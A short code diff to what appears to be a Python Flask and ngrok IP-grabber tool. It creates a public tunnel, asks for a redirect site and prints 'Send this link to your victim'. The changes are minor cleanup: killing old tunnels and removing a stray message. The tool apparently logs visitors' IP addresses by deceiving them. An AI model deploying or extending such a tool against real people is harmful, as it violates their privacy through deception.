@@ -11,10 +11,11 @@ from flask import render_template
 from flask import jsonify
 
 
+ngrok.kill() #Kill all previous ngrok tunnels.
 port_ = 80
 temp_ip_address_ = []
 uniqe_ips = []
-region = "us" #You can change ngrok region here
+region = "us" #You can change ngrok region here.
 ngrok_link = ngrok.connect(80, "http", region=region)
 app = Flask(__name__)
 log = logging.getLogger('werkzeug')
@@ -128,12 +129,10 @@ while True:
     redirect = str(input(style.GREEN("\n[+]") + style.RESET("Please enter website to redirect to (Default: www.google.com):")))
     if redirect == "" :
         redirect = "www.google.com"
-    print(str(style.GREEN("[+]") + style.RESET("Input error region must consist of 2 characters.")))
     print(str(style.GREEN("[+]") + style.RESET("Starting ngrok server...")))
     print(str(style.GREEN("\n[+]") + style.RESET("Send this link to your victim: {}\n").format(ngrok_link)))
     main()
     print(str(style.GREEN("[+]") + style.RESET("Closing ngrok server...")))
-    print(ngrok.disconnect(ngrok_link))
     print(ngrok.kill())
     clear()
     banner()
